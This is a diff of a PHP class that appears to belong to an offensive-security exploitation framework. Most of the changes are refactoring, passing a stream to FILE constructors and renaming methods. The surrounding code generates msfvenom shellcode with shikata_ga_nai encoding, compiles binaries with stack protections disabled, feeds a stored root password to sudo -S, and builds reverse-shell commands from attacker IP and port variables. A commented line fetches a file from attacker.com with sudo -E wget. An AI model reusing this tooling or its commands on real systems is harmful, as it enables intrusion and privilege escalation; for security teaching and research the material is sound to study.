@@ -755,9 +755,9 @@ info proc stat
 	
 	public function elf2esp_ebp4diff() {
 	if (! file_exists("$this->file_dir/find_esp"))
-	$file_c = new file("$this->dir_c/find_esp.c");$file_c->c2bin("-m32");
+	$file_c = new FILE($this->stream,"$this->dir_c/find_esp.c");$file_c->c2bin("-m32");
 	if (! file_exists("$this->file_dir/find_ebp"))
-	$file_c = new file("$this->dir_c/find_ebp.c");$file_c->c2bin("-m32");
+	$file_c = new FILE($this->stream,"$this->dir_c/find_ebp.c");$file_c->c2bin("-m32");
 	$this->img("$this->dir_img/bof/image006.png");
 	$this->img("$this->dir_img/bof/image007.png");
 	$this->os2aslr4no();
@@ -1202,14 +1202,14 @@ info proc stat
 	public function elf2addr4lib_end($lib) {
 	$lib = trim($lib);
 	$this->titre("$lib End");
-	$obj_lib = new FILE($lib);	
+	$obj_lib = new FILE($this->stream,$lib);	
 	return trim($this->req_ret_str("gdb -q --batch $this->file_path -ex \"b main\" -ex \"r `python -c 'print \\\"AAAA\\\"'`\" -ex \"info proc mappings\" | grep -m1 '$obj_lib->file_name' | cut -d' ' -f2"));
 	}
 	
 	public function elf2addr4lib_start($lib) {
 	$lib = trim($lib);
 	$this->titre("$lib Start");
-	$obj_lib = new FILE($lib);
+	$obj_lib = new FILE($this->stream,$lib);
 	return trim($this->req_ret_str("gdb -q --batch $this->file_path -ex \"b main\" -ex \"r `python -c 'print \\\"AAAA\\\"'`\" -ex \"info proc mappings\" | grep '0x0' | grep -m1 '$obj_lib->file_name' | cut -d' ' -f1"));
 	}
 	
@@ -1547,7 +1547,7 @@ L’espace noyau allant de 0xC0000000 à 0xFFFFFFFF ");
 	    $name = "getenv";
 	    $this->requette("cp -v $this->dir_c/$name.c $this->file_dir/$name.c");
 	    $c_code = file_get_contents("$this->file_dir/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
-	    $file_c = new FILE("$this->file_dir/$name.c");
+	    $file_c = new FILE($this->stream,"$this->file_dir/$name.c");
 	    //$this->requette("gedit $file_c->file_path");
 	    $name_prog = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
 	    
@@ -1602,7 +1602,7 @@ L’espace noyau allant de 0xC0000000 à 0xFFFFFFFF ");
 	public function elf4shellcode($exec,$badchar) { 
 	$this->requette( "msfvenom --payload linux/x86/exec cmd=\"$exec\" --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 1 --bad-chars '$badchar' --format c > $this->file_dir/$this->file_name.shellcode ");
 	$this->requette( "echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local $this->file_dir/$this->file_name.shellcode ");
-	return new file("$this->file_dir/$this->file_name.shellcode");
+	return new FILE($this->stream,"$this->file_dir/$this->file_name.shellcode");
 	}
 	
 	public function elf2hex() { // ne donne rien de concluant
@@ -1621,9 +1621,9 @@ L’espace noyau allant de 0xC0000000 à 0xFFFFFFFF ");
 	// $this->requette("dumpelf $this->file_path"); $this->pause();
 	//$this->requette("binwalk -Me $this->file_path");
 	//$this->requette("cd $this->file_dir; perf record -g -- ./$this->file_name AAAA ; perf script | c++filt | gprof2dot -f perf > $this->file_dir/$this->file_name.perf.dot; xdot $this->file_dir/$this->file_name.perf.dot");
-	$this->file_file2info();
-	$this->file_file2stat();
-	$this->file_file2metadata();
+	$this->file2info();
+	$this->file2stat();
+	$this->file2metadata();
 	//$this->elf2sections();
 	//$this->elf2fonctions();
 	}
@@ -1639,7 +1639,7 @@ L’espace noyau allant de 0xC0000000 à 0xFFFFFFFF ");
 	
 	
 	if (!file_exists($env_bin)){
-	    $bin = new file($env_file);
+	    $bin = new FILE($this->stream,$env_file);
 	$bin->file_c2elf("-m32");
 	}
 	$query = "$env_bin $id $this->file_path";
@@ -2866,7 +2866,7 @@ sh X sh X $cmd ";
 	                /*
 	                 export URL=http://attacker.com/file_to_get
 	                 export LFILE=file_to_save
-	                 sudo -E wget $URL -O $LFILE
+	                 sudo -E wget $URL -qO $LFILE
 	                 */
 	                $data_sudo = "\"$via_suid -c '$cmd'\" ";
 	                break;
@@ -2878,7 +2878,7 @@ sh X sh X $cmd ";
 	                
 	            case "wine":
 	                $file_path = "$this->dir_tmp/$sha1_hash.exe";
-	                $obj_file = new FILE($file_path);
+	                $obj_file = new FILE($this->stream,$file_path);
 	                $cmd = $this->rev8nc($attacker_ip, $attacker_port, $shell);
 	                $cmd = "id";
 	                // cmd/windows/generic
